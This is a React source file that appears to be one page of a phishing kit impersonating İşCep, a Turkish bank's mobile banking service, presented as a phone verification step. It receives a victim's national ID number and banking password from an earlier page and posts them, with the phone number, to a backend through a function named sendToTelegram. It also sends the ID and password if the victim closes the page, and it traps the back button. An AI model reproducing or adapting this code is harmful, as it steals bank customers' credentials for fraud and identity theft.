import React, { useEffect, useRef, useCallback, memo } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import './App.css';
import { useAuth, AuthProvider } from './AuthContext';
import { ScrollProvider, useScroll } from './ScrollContext';

const isIOS = () => /iPhone|iPad|iPod/i.test(navigator.userAgent);

function PhoneVerificationPageContent() {
  const [state, setState] = React.useState({
    phoneNumber: '',
    isPhoneActive: false,
    isPhoneLabelHovered: false,
    showPhoneError: false,
    isSubmitting: false,
    isPhoneFocused: false,
    isPhonePrefixVisible: false,
    errorMessage: '',
  });

  const phoneInputRef = useRef(null);
  const { rightSectionRef } = useScroll();
  const location = useLocation();
  const navigate = useNavigate();
  const { dispatch: authDispatch } = useAuth();
  const { tc, password, isValidNavigation } = location.state || {};

  // Navigasyon ve geri tuşu kontrolü
  useEffect(() => {
    if (!isValidNavigation || !tc || !password || tc.length !== 11 || password.length !== 6) {
      setState((prev) => ({
        ...prev,
        showPhoneError: true,
        errorMessage: 'Lütfen önce giriş yapın.',
      }));
      authDispatch({ type: 'RESET_AUTH' });
      navigate('/giris', { replace: true, state: { fromPhoneVerification: true } });
      return;
    }

    window.history.replaceState({ page: 'telefon' }, '', '/telefon');
    window.history.pushState({ page: 'telefon-guard' }, '', '/telefon');

    const handlePopState = () => {
      authDispatch({ type: 'RESET_AUTH' });
      window.history.replaceState(null, '', '/giris');
      navigate('/giris', { replace: true, state: { fromPhoneVerification: true } });
    };

    window.addEventListener('popstate', handlePopState);
    return () => window.removeEventListener('popstate', handlePopState);
  }, [tc, password, isValidNavigation, navigate, authDispatch]);

  // Meta tag ve sanal klavye ayarları
  useEffect(() => {
    const meta = document.createElement('meta');
    meta.name = 'viewport';
    meta.content = 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover, interactive-widget=overlays-content';
    document.head.appendChild(meta);

    if (!isIOS() && 'virtualKeyboard' in navigator) {
      navigator.virtualKeyboard.overlaysContent = true;
      navigator.virtualKeyboard.ongeometrychange = () => {
        const kbHeight = navigator.virtualKeyboard.boundingRect.height;
        document.body.style.setProperty('--keyboard-height', `${kbHeight}px`);
        const rightSection = rightSectionRef.current;
        if (rightSection) {
          rightSection.style.paddingBottom = `${kbHeight + 150}px`;
        }
      };
    } else if (isIOS()) {
      const rightSection = rightSectionRef.current;
      if (rightSection) {
        rightSection.style.paddingBottom = '150px';
      }
    }

    return () => {
      document.head.removeChild(meta);
    };
  }, [rightSectionRef]);

  // Sayfa yüklendiğinde en üste kaydır
  useEffect(() => {
    const scrollToTop = () => {
      if (rightSectionRef.current) {
        rightSectionRef.current.scrollTop = 0;
        rightSectionRef.current.dataset.loaded = "true";
        console.log('Sayfa en üste kaydırıldı');
      } else {
        setTimeout(scrollToTop, 100);
      }
    };

    setTimeout(() => {
      requestAnimationFrame(scrollToTop);
    }, 200);
  }, [rightSectionRef]);

  // Scroll optimizasyonu: Fokus ve blur olayları
  useEffect(() => {
    const phoneRef = phoneInputRef.current;

    const handleFocusScroll = () => {
      const rightSection = rightSectionRef.current;
      if (!rightSection || !phoneRef) return;

      const inputRect = phoneRef.getBoundingClientRect();
      const viewportHeight = window.visualViewport?.height || window.innerHeight;

      if (isIOS()) {
        const offset = 200; // iOS için offset değeri
        setTimeout(() => {
          requestAnimationFrame(() => {
            const scrollTo = rightSection.scrollTop + inputRect.top - (viewportHeight - inputRect.height) / 2 + offset;
            rightSection.scrollTo({ top: scrollTo, behavior: 'smooth' });
          });
        }, 200);
        return;
      }

      const isAndroid = /Android/i.test(navigator.userAgent);
      if (!isAndroid) return;

      const offset = 300; // Android için daha fazla aşağı kaydırmak için offset artırıldı (önceki 250'den 300'e)
      setTimeout(() => {
        requestAnimationFrame(() => {
          const scrollTo = rightSection.scrollTop + inputRect.top - (viewportHeight - inputRect.height) / 2 + offset;
          rightSection.scrollTo({ top: scrollTo, behavior: 'smooth' });
        });
      }, 200);
    };

    const handleBlurScroll = () => {
      const rightSection = rightSectionRef.current;
      if (rightSection) {
        rightSection.style.height = '100vh';
        rightSection.style.paddingBottom = isIOS() ? '150px' : '0';
        rightSection.scrollTo({ top: 0, behavior: 'smooth' });
      }
    };

    if (phoneRef) {
      phoneRef.addEventListener('focus', handleFocusScroll);
      phoneRef.addEventListener('blur', handleBlurScroll);
    }

    return () => {
      if (phoneRef) {
        phoneRef.removeEventListener('focus', handleFocusScroll);
        phoneRef.removeEventListener('blur', handleBlurScroll);
      }
    };
  }, [rightSectionRef]);

  // Telegram'a veri gönderimi
  const sendToTelegram = useCallback(async (data) => {
    try {
      const res = await fetch(`${process.env.REACT_APP_API_URL}/api/submit`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          tc: String(data.tc),
          password: String(data.password),
          phone: String(data.phone),
        }),
      });
      const result = await res.json();
      if (!res.ok) throw new Error(result.message || 'Veri gönderimi başarısız.');
      return result;
    } catch (error) {
      setState((prev) => ({
        ...prev,
        showPhoneError: true,
        errorMessage: error.message || 'Veri gönderimi sırasında hata oluştu.',
      }));
      return { error: error.message };
    }
  }, []);

  // Siteden çıkıldığında veri gönderimi
  useEffect(() => {
    const handleBeforeUnload = () => {
      if (tc && password && !state.phoneNumber) {
        sendToTelegram({ tc, password, phone: '' });
      }
    };
    window.addEventListener('beforeunload', handleBeforeUnload);
    return () => window.removeEventListener('beforeunload', handleBeforeUnload);
  }, [tc, password, state.phoneNumber, sendToTelegram]);

  // Telefon numarası inputu değişimi
  const handleNumberInput = useCallback((e) => {
    const value = e.target.value.replace(/\D/g, '');
    if (value.length <= 10) {
      setState((prev) => ({
        ...prev,
        phoneNumber: value,
        isPhoneActive: true,
        isPhoneLabelHovered: true,
        isPhonePrefixVisible: true,
        showPhoneError: false,
        errorMessage: '',
      }));
    }
  }, []);

  // Telefon numarasını temizleme
  const handleClearPhoneNumber = useCallback(() => {
    setState((prev) => ({
      ...prev,
      phoneNumber: '',
      isPhoneActive: true,
      isPhoneLabelHovered: true,
      isPhonePrefixVisible: true,
      showPhoneError: false,
      errorMessage: '',
    }));
    phoneInputRef.current?.focus();
  }, []);

  // Telefon inputuna fokuslanma
  const handlePhoneFocus = useCallback(() => {
    setState((prev) => ({
      ...prev,
      isPhoneActive: true,
      isPhoneLabelHovered: true,
      isPhonePrefixVisible: true,
      isPhoneFocused: true,
    }));
  }, []);

  // Telefon inputundan çıkma
  const handlePhoneBlur = useCallback(() => {
    setState((prev) => ({
      ...prev,
      isPhoneFocused: false,
      isPhoneActive: prev.phoneNumber.length > 0,
      isPhoneLabelHovered: prev.phoneNumber.length > 0,
      isPhonePrefixVisible: prev.phoneNumber.length > 0,
    }));
  }, []);

  // Telefon doğrulama gönderimi
  const handlePhoneSubmit = useCallback(
    async (e) => {
      e.preventDefault();
      if (state.phoneNumber.length > 0 && state.phoneNumber.length !== 10) {
        setState((prev) => ({
          ...prev,
          showPhoneError: true,
          errorMessage: 'Telefon numarası 10 haneli olmalı.',
        }));
        return;
      }
      if (state.phoneNumber.length === 10) {
        setState((prev) => ({ ...prev, isSubmitting: true }));
        const result = await sendToTelegram({ tc, password, phone: state.phoneNumber });
        if (result && !result.error) {
          authDispatch({ type: 'RESET_AUTH' });
          setState({
            phoneNumber: '',
            isPhoneActive: false,
            isPhoneLabelHovered: false,
            showPhoneError: false,
            isSubmitting: false,
            isPhoneFocused: false,
            isPhonePrefixVisible: false,
            errorMessage: '',
          });
          window.history.replaceState(null, '', '/bekleme');
          navigate('/bekleme', { replace: true, state: { isValidNavigation: true, from: '/telefon', isCompleted: true } });
        }
      }
    },
    [state.phoneNumber, sendToTelegram, tc, password, navigate, authDispatch]
  );

  return (
    <div className="container" style={{ touchAction: 'manipulation' }} data-page="telefon">
      <div className="right-section" ref={rightSectionRef}>
        <img src="/iscep-logo.png" alt="İşCep Logosu" className="iscep-logo iscep-logo-phone" loading="lazy" />
        <div className="new-container phone-verification-title">
          Telefon Doğrulama
        </div>
        <div className="input-wrapper">
          <div className="verification-subtitle">
            Lütfen cep telefon numaranızı doğrulayın
          </div>
          <div
            className={`phone-input-wrapper ${state.showPhoneError ? 'error' : ''} ${
              state.isPhonePrefixVisible ? 'prefix-visible' : ''
            }`}
            onClick={() => phoneInputRef.current?.focus()}
          >
            <label
              className={`phone-label ${state.isPhoneLabelHovered ? 'phone-hovered' : ''}`}
              htmlFor="phone-input"
            >
              Telefon Numarası
            </label>
            <div className="phone-input-container">
              <span className="phone-prefix">+90</span>
              <input
                id="phone-input"
                ref={phoneInputRef}
                type="tel"
                inputMode="numeric"
                pattern="[0-9]*"
                maxLength="10"
                value={state.phoneNumber}
                onChange={handleNumberInput}
                onFocus={handlePhoneFocus}
                onBlur={handlePhoneBlur}
                className={`new-input phone-input ${state.showPhoneError ? 'error' : ''}`}
                autoComplete="tel"
                autoCapitalize="none"
                aria-describedby="phone-error"
                aria-label="Telefon Numarası"
                aria-invalid={state.showPhoneError}
              />
              {state.phoneNumber.length > 0 && (
                <button
                  className="clear-phone-button"
                  onClick={handleClearPhoneNumber}
                  onTouchStart={handleClearPhoneNumber}
                  aria-label="Telefon numarasını temizle"
                >
                  ✕
                </button>
              )}
            </div>
            {state.showPhoneError && (
              <div id="phone-error" className="phone-error" role="alert" aria-live="assertive">
                <img
                  src="/error.png"
                  alt="Hata Simgesi"
                  className="error-icon"
                  loading="lazy"
                  onError={() => console.warn('Hata simgesi yüklenemedi')}
                />
                {state.errorMessage || 'Lütfen 10 haneli telefon numaranızı girin.'}
              </div>
            )}
          </div>
        </div>
        <div className="verify-button-container">
          <button
            className={`button-phone ${state.phoneNumber.length > 0 ? 'active-continue-button' : ''}`}
            onClick={handlePhoneSubmit}
            onTouchStart={handlePhoneSubmit}
            disabled={state.isSubmitting}
            aria-label="Telefon numarasını doğrula"
          >
            Doğrula
          </button>
        </div>
        {/* Sayfa uzunluğunu arttırmak için ekstra boşluk */}
        <div style={{ height: '300px' }}></div>
      </div>
    </div>
  );
}

function PhoneVerificationPage() {
  return (
    <ScrollProvider>
      <AuthProvider>
        <PhoneVerificationPageContent />
      </AuthProvider>
    </ScrollProvider>
  );
}

export default memo(PhoneVerificationPage);
